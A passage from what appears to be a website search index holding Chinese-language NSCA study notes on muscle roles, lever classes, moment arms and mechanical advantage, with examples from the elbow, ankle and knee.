\uff1a\u8fd9\u4e9b\u808c\u8089\u7684\u4f5c\u7528\u662f\u51cf\u6162\u6216\u505c\u6b62\u52a8\u4f5c\u3002\u4f8b\u5982\uff0c\u5728\u6295\u63b7\u8fc7\u7a0b\u4e2d\uff0c\u5f53\u8098\u5173\u8282\u63a5\u8fd1\u5b8c\u5168\u4f38\u5c55\u65f6\uff0c\u80b1\u4e8c\u5934\u808c\u4f5c\u4e3a\u62ee\u6297\u808c\u4f1a\u51cf\u901f\u5e76\u505c\u6b62\u8098\u5173\u8282\u7684\u8fd0\u52a8\uff0c\u4ece\u800c\u4fdd\u62a4\u5173\u8282\uff0c\u9632\u6b62\u97e7\u5e26\u548c\u8f6f\u9aa8\u53d7\u4f24\u3002 \u534f\u540c\u808c \uff1a\u8fd9\u4e9b\u662f\u95f4\u63a5\u5e2e\u52a9\u5b8c\u6210\u52a8\u4f5c\u7684\u808c\u8089\u3002\u4f8b\u5982\uff0c\u5728\u4e0a\u81c2\u6d3b\u52a8\u65f6\uff0c\u80a9\u80db\u9aa8\u7684\u7a33\u5b9a\u808c\u8089\u662f\u534f\u540c\u808c\u3002\u5982\u679c\u6ca1\u6709\u8fd9\u4e9b\u534f\u540c\u808c\uff0c\u8d1f\u8d23\u79fb\u52a8\u4e0a\u81c2\u7684\u808c\u8089\uff08\u5176\u4e2d\u8bb8\u591a\u8d77\u59cb\u4e8e\u80a9\u80db\u9aa8\uff09\u5c31\u65e0\u6cd5\u6709\u6548\u5de5\u4f5c\u3002\u5f53\u4e3b\u52a8\u808c\u7a7f\u8fc7\u4e24\u4e2a\u5173\u8282\u65f6\uff0c\u9700\u8981\u534f\u540c\u808c\u6765\u5171\u540c\u63a7\u5236\u8eab\u4f53\u7684\u8fd0\u52a8\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53\u4f60\u4ece\u6df1\u8e72\u4f4d\u7ad9\u8d77\u65f6\uff0c\u6d89\u53ca\u4f38\u9acb\u548c\u4f38\u819d\u4e24\u4e2a\u52a8\u4f5c\u3002\u80a1\u76f4\u808c\u7a7f\u8fc7\u9acb\u5173\u8282\u548c\u819d\u5173\u8282\uff0c\u5f53\u5b83\u6536\u7f29\u65f6\u4f1a\u5c48\u9acb\u548c\u4f38\u819d\u3002\u5982\u679c\u4f60\u7ad9\u8d77\u65f6\u80a1\u76f4\u808c\u6536\u7f29\u4f7f\u819d\u5173\u8282\u4f38\u5c55\uff0c\u540c\u65f6\u8981\u4fdd\u6301\u8eab\u4f53\u4e0d\u524d\u503e\uff0c\u90a3\u4e48\u81c0\u5927\u808c\uff08\u4f38\u9acb\u808c\u7fa4\uff09\u5fc5\u987b\u534f\u540c\u4f5c\u7528\uff0c\u4ee5\u62b5\u6d88\u80a1\u76f4\u808c\u6536\u7f29\u5f15\u8d77\u7684\u9acb\u5173\u8282\u5c48\u66f2\u3002 \u8fd9\u4e9b\u808c\u8089\u89d2\u8272\u7684\u534f\u8c03\u4f5c\u7528\uff0c\u786e\u4fdd\u52a8\u4f5c\u7684\u51c6\u786e\u6027\u548c\u7a33\u5b9a\u6027\uff0c\u540c\u65f6\u4fdd\u62a4\u5173\u8282\u548c\u97e7\u5e26\u514d\u53d7\u635f\u4f24\u3002","title":"\u808c\u8089\u6839\u636e\u52a8\u4f5c\u7684\u5206\u7c7b"},{"location":"soft/NSCA/#_46","text":"\u652f\u70b9 \uff1a\u6760\u6746\u7684\u652f\u6491\u70b9\uff0c\u662f\u6760\u6746\u65cb\u8f6c\u7684\u4e2d\u5fc3\u3002 \u6760\u6746 \uff1a\u4e00\u79cd\u575a\u786c\u6216\u534a\u575a\u786c\u7684\u7ed3\u6784\uff0c\u5f53\u53d7\u5230\u4e00\u4e2a\u529b\u4f5c\u7528\u5728\u652f\u70b9\u4e4b\u5916\u65f6\uff0c\u4f1a\u5bf9\u963b\u788d\u5b83\u65cb\u8f6c\u7684\u7269\u4f53\u65bd\u52a0\u529b\u3002\u4f8b\u5982\uff0c\u56fe2.1\u4e2d\u5c55\u793a\u4e86\u6760\u6746\u5982\u4f55\u5de5\u4f5c\u3002 \u529b\u81c2 \uff08\u4e5f\u53eb\u6760\u6746\u81c2\u6216\u626d\u529b\u81c2\uff09\uff1a\u662f\u4ece\u529b\u7684\u4f5c\u7528\u7ebf\u5230\u652f\u70b9\u7684\u5782\u76f4\u8ddd\u79bb\u3002\u529b\u7684\u4f5c\u7528\u7ebf\u662f\u4e00\u6761\u901a\u8fc7\u65bd\u529b\u70b9\u5e76\u4e14\u4e0e\u529b\u7684\u65b9\u5411\u4e00\u81f4\u7684\u7ebf\u3002MAF\u548cMRF \u808c\u529b \uff1a\u808c\u8089\u901a\u8fc7\u751f\u5316\u4f5c\u7528\u6216\u975e\u6536\u7f29\u6027\u7ec4\u7ec7\u88ab\u62c9\u957f\u65f6\u4ea7\u751f\u7684\u529b\uff0c\u5c06\u808c\u8089\u7684\u4e24\u7aef\u62c9\u5411\u5f7c\u6b64\u3002FR \u963b\u529b \uff1a\u6765\u81ea\u8eab\u4f53\u5916\u90e8\u7684\u529b\uff08\u4f8b\u5982\u91cd\u529b\u3001\u60ef\u6027\u529b\u548c\u6469\u64e6\u529b\uff09\uff0c\u5176\u4f5c\u7528\u65b9\u5411\u4e0e\u808c\u529b\u76f8\u53cd\u3002FA \u529b\u77e9 \uff08\u4e5f\u53eb\u626d\u77e9\uff09\uff1a\u4e00\u4e2a\u529b\u4f7f\u4e00\u4e2a\u7269\u4f53\u503e\u5411\u4e8e\u56f4\u7ed5\u7279\u5b9a\u652f\u70b9\u65cb\u8f6c\u7684\u7a0b\u5ea6\u3002\u5b83\u7684\u5927\u5c0f\u7b49\u4e8e\u529b\u4e58\u4ee5\u529b\u81c2\u7684\u957f\u5ea6\u3002 \u4ec0\u4e48\u662f\u529b\u77e9\uff1a \u4ec0\u4e48\u662f\u529b\u77e9\uff1f_\u54d4\u54e9\u54d4\u54e9_bilibili \u529b\u77e9\u7684\u65b9\u5411\uff1a \u529b\u77e9\u662f\u77e2\u91cf\u5417\uff1f\u6709\u65b9\u5411\u5417\uff1f_\u54d4\u54e9\u54d4\u54e9_bilibili \u673a\u68b0\u6548\u7387 \uff1a\u662f\u52a8\u529b\u529b\u81c2\u4e0e\u963b\u529b\u529b\u81c2\u7684\u6bd4\u503c\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff1a\u60f3\u8c61\u4e00\u4e0b\u7528\u64ac\u68cd\u64ac\u5f00\u4e00\u4e2a\u7bb1\u5b50\u3002\u652f\u70b9\u662f\u64ac\u68cd\u7684\u5e95\u90e8\u63a5\u89e6\u5730\u9762\u7684\u5730\u65b9\u3002\u64ac\u68cd\u7684\u4e00\u7aef\u662f\u4f60\u7528\u529b\u7684\u5730\u65b9\uff08\u52a8\u529b\u529b\u81c2\uff09\uff0c\u53e6\u4e00\u7aef\u662f\u64ac\u8d77\u7bb1\u5b50\u7684\u5730\u65b9\uff08\u963b\u529b\u529b\u81c2\uff09\u3002 \u9ad8\u673a\u68b0\u6548\u7387 \uff1a\u5982\u679c\u64ac\u68cd\u7684\u52a8\u529b\u529b\u81c2\u6bd4\u963b\u529b\u529b\u81c2\u957f\u5f88\u591a\uff0c\u4f60\u9700\u8981\u7528\u5f88\u5c0f\u7684\u529b\u5c31\u80fd\u64ac\u8d77\u7bb1\u5b50\u3002 \u4f4e\u673a\u68b0\u6548\u7387 \uff1a\u5982\u679c\u64ac\u68cd\u7684\u52a8\u529b\u529b\u81c2\u6bd4\u963b\u529b\u529b\u81c2\u77ed\u5f88\u591a\uff0c\u4f60\u9700\u8981\u7528\u5f88\u5927\u7684\u529b\u624d\u80fd\u64ac\u8d77\u7bb1\u5b50\u3002 \u8fd9\u610f\u5473\u7740\uff0c\u5f53\u673a\u68b0\u6548\u7387\u5927\u4e8e1\u65f6\uff0c\u52a8\u529b\u529b\u81c2\u8f83\u957f\uff0c\u4f60\u7528\u8f83\u5c0f\u7684\u529b\u5c31\u80fd\u5e73\u8861\u8f83\u5927\u7684\u963b\u529b\uff1b\u5f53\u673a\u68b0\u6548\u7387\u5c0f\u4e8e1\u65f6\uff0c\u52a8\u529b\u529b\u81c2\u8f83\u77ed\uff0c\u4f60\u9700\u8981\u7528\u8f83\u5927\u7684\u529b\u624d\u80fd\u5e73\u8861\u963b\u529b\u3002","title":"\u4ec0\u4e48\u662f\u6760\u6746"},{"location":"soft/NSCA/#_47","text":"","title":"\u4eba\u4f53\u4e2d\u51e0\u79cd\u6760\u6760"},{"location":"soft/NSCA/#_48","text":"\u8fd9\u5f20\u56fe\u7247\u5c55\u793a\u4e86\u8098\u90e8\u4f38\u5c55\u7684\u808c\u8089\u9aa8\u9abc\u6a21\u578b\uff0c\u5e76\u89e3\u91ca\u4e86\u5176\u4e2d\u7684\u529b\u5b66\u539f\u7406\u3002\u4ee5\u4e0b\u662f\u8be6\u7ec6\u89e3\u91ca\uff1a \u6760\u6746\u7c7b\u578b \uff1a \u56fe\u4e2d\u5c55\u793a\u7684\u662f\u4e00\u4e2a \u7b2c\u4e00\u7c7b\u6760\u6746 \u3002\u5728\u7b2c\u4e00\u7c7b\u6760\u6746\u4e2d\uff0c\u652f\u70b9\uff08O\uff09\u4f4d\u4e8e\u808c\u529b\uff08FM\uff09\u548c\u963b\u529b\uff08FR\uff09\u4e4b\u95f4\uff0c\u7c7b\u4f3c\u4e8e\u7fd8\u7fd8\u677f\u7684\u7ed3\u6784\u3002 \u529b\u7684\u4f5c\u7528\u70b9 \uff1a FM\uff08\u808c\u529b\uff09 \uff1a\u7531\u80b1\u4e09\u5934\u808c\u4ea7\u751f\u7684\u529b\uff0c\u4f5c\u7528\u5728\u524d\u81c2\u7684\u8fd1\u7aef\uff08\u9760\u8fd1\u8098\u90e8\uff09\uff0c\u4f7f\u524d\u81c2\u4f38\u5c55\u3002 FR\uff08\u963b\u529b\uff09 \uff1a\u6765\u81ea\u5916\u90e8\u963b\u529b\uff0c\u4f8b\u5982\u624b\u6301\u91cd\u7269\u65f6\u7684\u91cd\u91cf\uff0c\u4f5c\u7528\u5728\u524d\u81c2\u7684\u8fdc\u7aef\uff08\u9760\u8fd1\u624b\u90e8\uff09\uff0c\u4e0eFM\u65b9\u5411\u76f8\u53cd\u3002 \u529b\u81c2 \uff1a MM\uff08\u808c\u529b\u529b\u81c2\uff09 \uff1a\u4ece\u652f\u70b9\uff08O\uff09\u5230FM\u4f5c\u7528\u70b9\u7684\u8ddd\u79bb\uff0c\u4e3a5\u5398\u7c73\u3002 MR\uff08\u963b\u529b\u529b\u81c2\uff09 \uff1a\u4ece\u652f\u70b9\uff08O\uff09\u5230FR\u4f5c\u7528\u70b9\u7684\u8ddd\u79bb\uff0c\u4e3a40\u5398\u7c73\u3002 \u529b\u5b66\u6548\u7387 \uff1a \u516c\u5f0f\uff1a\u673a\u68b0\u6548\u7387 = MM / MR = 5cm / 40cm = 0.125 \u7531\u4e8eMM\u8fdc\u5c0f\u4e8eMR\uff0c\u6240\u4ee5FM\u5fc5\u987b\u8fdc\u5927\u4e8eFR\u3002\u8fd9\u610f\u5473\u7740\u4e3a\u4e86\u62b5\u6d88\u76f8\u5bf9\u8f83\u5c0f\u7684\u5916\u90e8\u963b\u529b\uff0c\u80b1\u4e09\u5934\u808c\u9700\u8981\u4ea7\u751f\u5f88\u5927\u7684\u529b\u91cf\u3002 \u603b\u7ed3 \uff1a \u8fd9\u79cd\u6760\u6746\u5b89\u6392\u7684\u7279\u70b9\u662f\u9700\u8981\u5f88\u5927\u7684\u808c\u529b\u6765\u62b5\u6d88\u8f83\u5c0f\u7684\u5916\u90e8\u963b\u529b\uff0c\u56e0\u6b64\u79f0\u4e3a\u8d39\u529b\u6760\u6746\u3002\u8fd9\u79cd\u529b\u5b66\u7ed3\u6784\u5728\u4eba\u4f53\u4e2d\u975e\u5e38\u5e38\u89c1\uff0c\u5c24\u5176\u662f\u80a2\u4f53\u7684\u8fd0\u52a8\u4e2d\uff0c\u901a\u8fc7\u8f83\u77ed\u7684\u529b\u81c2\u4ea7\u751f\u8f83\u5927\u7684\u529b\u6765\u8fdb\u884c\u8fd0\u52a8\u3002","title":"\u7b2c\u4e00\u7c7b\u6760\u6760"},{"location":"soft/NSCA/#_49","text":"\u8fd9\u5f20\u56fe\u7247\u5c55\u793a\u4e86\u8db3\u90e8\u5728\u8e2e\u811a\u52a8\u4f5c\u4e2d\u7684\u808c\u8089\u9aa8\u9abc\u6a21\u578b\uff0c\u5e76\u89e3\u91ca\u4e86\u5176\u4e2d\u7684\u529b\u5b66\u539f\u7406\u3002\u4ee5\u4e0b\u662f\u8be6\u7ec6\u89e3\u91ca\uff1a \u6760\u6746\u7c7b\u578b \uff1a \u56fe\u4e2d\u5c55\u793a\u7684\u662f\u4e00\u4e2a \u7b2c\u4e8c\u7c7b\u6760\u6746 \u3002\u5728\u7b2c\u4e8c\u7c7b\u6760\u6746\u4e2d\uff0c\u652f\u70b9\uff08O\uff09\u4f4d\u4e8e\u808c\u529b\uff08FM\uff09\u548c\u963b\u529b\uff08FR\uff09\u540c\u4e00\u4fa7\uff0c\u7c7b\u4f3c\u4e8e\u624b\u63a8\u8f66\u7684\u7ed3\u6784\u3002 \u529b\u7684\u4f5c\u7528\u70b9 \uff1a FM\uff08\u808c\u529b\uff09 \uff1a\u7531\u8153\u80a0\u808c\uff08\u5c0f\u817f\u540e\u90e8\u7684\u808c\u8089\uff09\u4ea7\u751f\u7684\u529b\uff0c\u4f5c\u7528\u5728\u811a\u8ddf\u4e0a\uff0c\u4f7f\u8eab\u4f53\u62ac\u8d77\u3002 FR\uff08\u963b\u529b\uff09 \uff1a\u6765\u81ea\u8eab\u4f53\u7684\u91cd\u91cf\uff0c\u901a\u8fc7\u91cd\u529b\u4f5c\u7528\u5728\u811a\u7684\u524d\u90e8\uff08\u9760\u8fd1\u811a\u8dbe\uff09\uff0c\u4e0eFM\u65b9\u5411\u76f8\u53cd\u3002 \u529b\u81c2 \uff1a MM\uff08\u808c\u529b\u529b\u81c2\uff09 \uff1a\u4ece\u652f\u70b9\uff08O\uff09\u5230FM\u4f5c\u7528\u70b9\u7684\u8ddd\u79bb\u3002 MR\uff08\u963b\u529b\u529b\u81c2\uff09 \uff1a\u4ece\u652f\u70b9\uff08O\uff09\u5230FR\u4f5c\u7528\u70b9\u7684\u8ddd\u79bb\u3002 \u529b\u5b66\u6548\u7387 \uff1a \u5728\u7b2c\u4e8c\u7c7b\u6760\u6746\u4e2d\uff0c\u808c\u529b\u529b\u81c2\uff08MM\uff09\u957f\u4e8e\u963b\u529b\u529b\u81c2\uff08MR\uff09\uff0c\u8fd9\u610f\u5473\u7740\u5b8c\u6210\u8fd9\u4e00\u52a8\u4f5c\u6240\u9700\u7684\u808c\u529b\u5c0f\u4e8e\u963b\u529b\uff08\u4f53\u91cd\u4ea7\u751f\u7684\u91cd\u529b\uff09\u3002 \u603b\u7ed3 \uff1a \u8fd9\u79cd\u6760\u6746\u5b89\u6392\u7684\u7279\u70b9\u662f\u808c\u529b\u4ea7\u751f\u7684\u4f5c\u7528\u529b\u81c2\u8f83\u957f\uff0c\u56e0\u6b64\u5b8c\u6210\u52a8\u4f5c\u6240\u9700\u7684\u808c\u529b\u76f8\u5bf9\u8f83\u5c0f\u3002\u8e2e\u811a\u52a8\u4f5c\u65f6\uff0c\u8153\u80a0\u808c\u6536\u7f29\uff0c\u901a\u8fc7\u8f83\u957f\u7684\u808c\u529b\u529b\u81c2\u62ac\u9ad8\u8eab\u4f53\u3002\u8fd9\u79cd\u529b\u5b66\u7ed3\u6784\u5728\u4eba\u4f53\u4e2d\u5e38\u89c1\uff0c\u7279\u522b\u662f\u5728\u9700\u8981\u957f\u65f6\u95f4\u627f\u53d7\u91cd\u91cf\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u7ad9\u7acb\u6216\u884c\u8d70\u3002 \u8fd9\u5f20\u56fe\u5c55\u793a\u4e86\u4eba\u4f53\u80b1\u4e8c\u5934\u808c\u5c48\u8098\u65f6\u7684\u529b\u5b66\u539f\u7406\uff0c\u5c5e\u4e8e\u7b2c\u4e09\u7c7b\u6760\u6746\u3002\u8ba9\u6211\u4eec\u5206\u89e3\u4e00\u4e0b\u8fd9\u5f20\u56fe\u548c\u6587\u5b57\u7684\u5185\u5bb9\uff0c\u5e2e\u52a9\u4f60\u66f4\u597d\u5730\u7406\u89e3\u3002","title":"\u7b2c\u4e8c\u7c7b\u6760\u6760"},{"location":"soft/NSCA/#_50","text":"\u7b2c\u4e09\u7c7b\u6760\u6746\u7684\u7279\u70b9\u662f\uff1a \u652f\u70b9 (\u8098\u5173\u8282) \uff1a\u4f4d\u4e8e\u6760\u6746\u4e00\u7aef\u3002 \u808c\u529b (FM) \u548c \u963b\u529b (FR) \u5747\u4f5c\u7528\u5728\u652f\u70b9\u7684\u4e00\u4fa7\u3002 \u808c\u529b\u7684\u529b\u81c2 (MM) \u77ed\u4e8e \u963b\u529b\u7684\u529b\u81c2 (MR) \u3002 \u56fe\u793a\u89e3\u6790 \u80b1\u4e8c\u5934\u808c (FM) \uff1a\u56fe\u4e2d\u7684\u7bad\u5934\u6807\u8bc6\u51fa\u80b1\u4e8c\u5934\u808c\u7684\u65b9\u5411\uff0c\u8fd9\u4e2a\u529b\u63a8\u52a8\u524d\u81c2\u4e0a\u5347\u3002 \u963b\u529b (FR) \uff1a\u624b\u4e2d\u63e1\u7740\u7684\u7269\u4f53\u5411\u4e0b\u65bd\u52a0\u7684\u529b\uff0c\u901a\u5e38\u662f\u7531\u4e8e\u91cd\u529b\u4f5c\u7528\u3002 \u529b\u81c2 (MM) \uff1a\u80b1\u4e8c\u5934\u808c\u65bd\u529b\u7684\u529b\u81c2\uff0c\u4ece\u8098\u5173\u8282\u5230\u80b1\u4e8c\u5934\u808c\u9644\u7740\u70b9\u7684\u8ddd\u79bb\u3002 \u963b\u529b\u81c2 (MR) \uff1a\u963b\u529b\u4f5c\u7528\u7684\u529b\u81c2\uff0c\u4ece\u8098\u5173\u8282\u5230\u624b\u4e2d\u7269\u4f53\u7684\u8ddd\u79bb\u3002 \u673a\u68b0\u6548\u7387 \u673a\u68b0\u6548\u7387 \u5c0f\u4e8e 1\uff1a\u56e0\u4e3a\u808c\u529b\u7684\u529b\u81c2\u77ed\u4e8e\u963b\u529b\u7684\u529b\u81c2\uff0c\u6240\u4ee5\u4e3a\u4e86\u5e73\u8861\u963b\u529b\uff0c\u808c\u529b\u5fc5\u987b\u5927\u4e8e\u963b\u529b\u3002 \u5e94\u7528 \uff1a\u5927\u591a\u6570\u4eba\u4f53\u808c\u8089\u5728\u56db\u80a2\u5173\u8282\u5468\u56f4\u5de5\u4f5c\u7684\u673a\u68b0\u6548\u7387\u90fd\u662f\u5c0f\u4e8e 1 \u7684\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5728\u8fd0\u52a8\u65f6\u808c\u8089\u9700\u8981\u4ea7\u751f\u8f83\u5927\u7684\u529b\u6765\u514b\u670d\u8f83\u5c0f\u7684\u963b\u529b\u3002 \u5177\u4f53\u4f8b\u5b50 \u80b1\u4e8c\u5934\u808c\u5f2f\u4e3e \uff1a\u5f53\u4f60\u5f2f\u66f2\u8098\u90e8\uff0c\u63d0\u8d77\u54d1\u94c3\u65f6\uff0c\u80b1\u4e8c\u5934\u808c\u65bd\u52a0\u7684\u529b\u5927\u4e8e\u54d1\u94c3\u7684\u91cd\u529b\uff0c\u8fd9\u662f\u56e0\u4e3a\u80b1\u4e8c\u5934\u808c\u7684\u529b\u81c2\u77ed\u4e8e\u54d1\u94c3\u5230\u8098\u5173\u8282\u7684\u8ddd\u79bb\u3002","title":"\u7b2c\u4e09\u7c7b\u6760\u6746"},{"location":"soft/NSCA/#_51","text":"\u8fd9\u5f20\u56fe\u5c55\u793a\u4e86\u9acc\u9aa8\u5728\u819d\u5173\u8282\u4f38\u5c55\u4e2d\u7684\u4f5c\u7528\uff0c\u5177\u4f53\u5206\u6790\u4e86\u9acc\u9aa8\u5982\u4f55\u901a\u8fc7\u4fdd\u6301\u80a1\u56db\u5934\u808c\u8171\u4e0e\u819d\u76d6\u65cb\u8f6c\u8f74\u7684\u8ddd\u79bb\u6765\u589e\u52a0\u673a\u68b0\u6548\u7387\u3002\u8ba9\u6211\u4eec\u5206\u89e3\u4e00\u4e0b\u8fd9\u5f20\u56fe\u548c\u6587\u5b57\u7684\u5185\u5bb9\uff0c\u5e2e\u52a9\u4f60\u66f4\u597d\u5730\u7406\u89e3\u3002 \u56fe\u793a\u89e3\u6790 \u9acc\u9aa8 (\u819d\u76d6\u9aa8) \uff1a\u4f4d\u4e8e\u819d\u5173\u8282\u524d\u65b9\uff0c\u8d77\u5230\u6760\u6746\u4f5c\u7528\u3002 \u80a1\u9aa8 \uff1a\u5927\u817f\u9aa8\u3002 \u80eb\u9aa8 \uff1a\u5c0f\u817f\u9aa8\u3002 \u80a1\u56db\u5934\u808c\u8171 \uff1a\u8fde\u63a5\u80a1\u56db\u5934\u808c\u548c\u9acc\u9aa8\u3002 \u65cb\u8f6c\u8f74 \uff1a\u819d\u5173\u8282\u7684\u65cb\u8f6c\u4e2d\u5fc3\uff0c\u4f4d\u7f6e\u4f1a\u968f\u7740\u819d\u5173\u8282\u7684\u8fd0\u52a8\u800c\u6539\u53d8\u3002 \u9acc\u97e7\u5e26 \uff1a\u8fde\u63a5\u9acc\u9aa8\u548c\u80eb\u9aa8\u7684\u97e7\u5e26\u3002 \u9acc\u9aa8\u7684\u4f5c\u7528 \u589e\u52a0\u673a\u68b0\u6548\u7387 \uff1a\u9acc\u9aa8\u901a\u8fc7\u4fdd\u6301\u80a1\u56db\u5934\u808c\u8171\u4e0e\u819d\u76d6\u65cb\u8f6c\u8f74\u7684\u8ddd\u79bb\u6765\u589e\u52a0\u673a\u68b0\u6548\u7387\u3002 \u529b\u81c2\u7684\u957f\u5ea6 \uff1a\u9acc\u9aa8\u7684\u4f4d\u7f6e\u4f7f\u5f97\u80a1\u56db\u5934\u808c\u7684\u529b\u81c2\u53d8\u957f\uff0c\u8fd9\u6837\u5728\u819d\u5173\u8282\u4f38\u5c55\u65f6\u53ef\u4ee5\u66f4\u6709\u6548\u5730\u7528\u529b\u3002 \u673a\u68b0\u6548\u7387\u7684\u53d8\u5316 \u9acc\u9aa8\u5b58\u5728\u65f6 \uff1a\u5982\u56fe(a)\u6240\u793a\uff0c\u9acc\u9aa8\u4f7f\u80a1\u56db\u5934\u808c\u8171\u4e0e\u65cb\u8f6c\u8f74\u7684\u8ddd\u79bb\u589e\u52a0\uff0c\u4ece\u800c\u4fdd\u6301\u8f83\u9ad8\u7684\u673a\u68b0\u6548\u7387\u3002 \u9acc\u9aa8\u7f3a\u5931\u65f6 \uff1a\u5982\u56fe(b)\u6240\u793a\uff0c\u5982\u679c\u6ca1\u6709\u9acc\u9aa8\uff0c\u80a1\u56db\u5934\u808c\u8171\u4f1a\u9760\u8fd1\u819d\u76d6\u7684\u65cb\u8f6c\u8f74\uff0c\u529b\u81c2\u53d8\u77ed\uff0c\u5bfc\u81f4\u673a\u68b0\u6548\u7387\u964d\u4f4e\u3002 \u5177\u4f53\u4f8b\u5b50 \u819d\u5173\u8282\u4f38\u5c55 \uff1a\u5f53\u4f60\u4f38\u5c55\u819d\u5173\u8282\u65f6\uff0c\u9acc\u9aa8\u5e2e\u52a9\u589e\u52a0\u80a1\u56db\u5934\u808c\u7684\u529b\u81c2\uff0c\u4f7f\u5f97\u4f60\u80fd\u591f\u66f4\u6709\u6548\u5730\u65bd\u52a0\u529b\u91cf\u3002\u8fd9\u5728\u8dd1\u6b65\u3001\u8df3\u8dc3\u7b49\u9700\u8981\u5f3a\u5927\u819d\u5173\u8282\u4f38\u5c55\u529b\u91cf\u7684\u8fd0\u52a8\u4e2d\u5c24\u4e3a\u91cd\u8981\u3002 \u819d\u5173\u8282\u8fd0\u52a8\u4e2d\u7684\u65cb\u8f6c\u8f74\u53d8\u5316 \u65cb\u8f6c\u8f74\u4f4d\u7f6e\u7684\u53d8\u5316 \uff1a\u7531\u4e8e\u819d\u5173\u8282\u4e0d\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u94f0\u94fe\u5173\u8282\uff0c\u5176\u65cb\u8f6c\u8f74\u7684\u4f4d\u7f6e\u4f1a\u968f\u7740\u8fd0\u52a8\u8303\u56f4\u7684\u6539\u53d8\u800c\u4e0d\u65ad\u53d8\u5316\uff0c\u8fd9\u8fdb\u4e00\u6b65\u5f71\u54cd\u4e86\u80a1\u56db\u5934\u808c\u548c\u8158\u7ef3\u808c\u7684\u529b\u81c2\u957f\u5ea6\u3002","title":"\u819d\u5173\u8282"},{"location":"soft/NSCA/#_52","text":"\u8fd9\u5f20\u56fe\u5c55\u793a\u4e86\u5728\u80b1\u4e8c\u5934\u808c\u53d1\u529b\u4f7f\u8098\u5173\u8282\u5c48\u66f2\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4ece\u5173\u8282\u7684\u65cb\u8f6c\u8f74\u5230\u808c\u8171\u4f5c\u7528\u7ebf\u7684\u5782\u76f4\u8ddd\u79bb\u5728\u6574\u4e2a\u5173\u8282\u6d3b\u52a8\u8303\u56f4\u5185\u7684\u53d8\u5316\u3002\u8ba9\u6211\u4eec\u8be6\u7ec6\u89e3\u6790\u4e00\u4e0b\u8fd9\u5f20\u56fe\u548c\u76f8\u5173\u5185\u5bb9\u3002 \u56fe\u793a\u89e3\u6790 \u8098\u5173\u8282\u5c48\u66f2\u7684\u4e0d\u540c\u89d2\u5ea6 \uff1a \u56fe\u4e2d\u5c55\u793a\u4e86\u8098\u5173\u8282\u4ece\u4f38\u5c55\u5230\u5c48\u66f2\u7684\u51e0\u4e2a\u4e0d\u540c\u89d2\u5ea6\u3002 \u5728\u6bcf\u4e2a\u89d2\u5ea6\u4e0b\uff0c\u6807\u8bb0\u4e86\u4ece\u8098\u5173\u8282\u7684\u65cb\u8f6c\u8f74\u5230\u80b1\u4e8c\u5934\u808c\u8171\u4f5c\u7528\u7ebf\u7684\u5782\u76f4\u8ddd\u79bb\uff08M\uff09\u3002 \u529b\u81c2 (M) \uff1a \u529b\u81c2 (M) \u6307\u7684\u662f\u4ece\u65cb\u8f6c\u8f74\u5230\u808c\u8089\u65bd\u529b\u7ebf\u7684\u5782\u76f4\u8ddd\u79bb\u3002 \u5728\u56fe\u793a\u7684\u4e0d\u540c\u89d2\u5ea6\u4e0b\uff0c\u529b\u81c2 (M) \u7684\u957f\u5ea6\u53d1\u751f\u53d8\u5316\u3002 \u5173\u952e\u70b9 \u53d8\u5316\u7684\u529b\u81c2 \uff1a \u5728\u8098\u5173\u8282\u4f38\u5c55\u548c\u5c48\u66f2\u7684\u8fc7\u7a0b\u4e2d\uff0c\u529b\u81c2 (M) \u7684\u957f\u5ea6\u5e76\u4e0d\u6052\u5b9a\u3002 \u5f53\u8098\u5173\u8282\u63a5\u8fd1\u5b8c\u5168\u4f38\u5c55\u6216\u5b8c\u5168\u5c48\u66f2\u65f6\uff0c\u529b\u81c2 (M) \u8f83\u77ed\u3002 \u5f53\u8098\u5173\u8282\u5f2f\u66f2\u5230\u4e00\u4e2a\u4e2d\u95f4\u4f4d\u7f6e\u65f6\uff0c\u529b\u81c2 (M) \u8f83\u957f\u3002 \u673a\u68b0\u6548\u7387\u7684\u53d8\u5316 \uff1a \u529b\u81c2 (M) \u8f83\u957f\u65f6\uff0c\u80b1\u4e8c\u5934\u808c\u65bd\u529b\u7684\u673a\u68b0\u6548\u7387\u8f83\u9ad8\u3002 \u529b\u81c2 (M) \u8f83\u77ed\u65f6\uff0c\u673a\u68b0\u6548\u7387\u8f83\u4f4e\uff0c\u9700\u8981\u66f4\u591a\u7684\u808c\u8089\u529b\u91cf\u6765\u4ea7\u751f\u540c\u6837\u7684\u529b\u77e9\u3002 \u9acc\u9aa8\u4e0e\u8098\u5173\u8282\u7684\u6bd4\u8f83 \u5728\u819d\u5173\u8282\u4e2d\uff0c\u9acc\u9aa8\u53ef\u4ee5\u4fdd\u6301\u80a1\u56db\u5934\u808c\u8171\u4e0e\u5173\u8282\u65cb\u8f6c\u8f74\u7684\u5782\u76f4\u8ddd\u79bb\u76f8\u5bf9\u6052\u5b9a\uff0c\u4ece\u800c\u63d0\u9ad8\u673a\u68b0\u6548\u7387\u3002 \u5728\u8098\u5173\u8282\u4e2d\uff0c\u6ca1\u6709\u7c7b\u4f3c\u9acc\u9aa8\u7684\u7ed3\u6784\uff0c\u56e0\u6b64\u5728\u8098\u90e8\u8fd0\u52a8\u7684\u8fc7\u7a0b\u4e2d\uff0c\u80b1\u4e8c\u5934\u808c\u8171\u7684\u529b\u81c2\u957f\u5ea6\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u5bfc\u81f4\u673a\u68b0\u6548\u7387\u7684\u53d8\u5316\u3002","title":"\u8098\u5173\u8282"},{"location":"soft/NSCA/#_53","text":"\u529f\u80fd\u5dee\u5f02 \u819d\u5173\u8282 \uff1a\u4e3b\u8981\u627f\u53d7\u8eab\u4f53\u7684\u91cd\u91cf\uff0c\u5e76\u9700\u8981\u5728\u884c\u8d70\u3001\u8dd1\u6b65\u3001\u8df3\u8dc3\u7b49\u6d3b\u52a8\u4e2d\u63d0\u4f9b\u5f3a\u5927\u7684\u652f\u6491\u529b\u548c\u7a33\u5b9a\u6027\u3002\u9acc\u9aa8\u7684\u5b58\u5728\u5e2e\u52a9\u589e\u52a0\u80a1\u56db\u5934\u808c\u7684\u529b\u81c2\uff0c\u4ece\u800c\u63d0\u9ad8\u673a\u68b0\u6548\u7387\uff0c\u51cf\u5c11\u808c\u8089\u7684\u75b2\u52b3\u3002 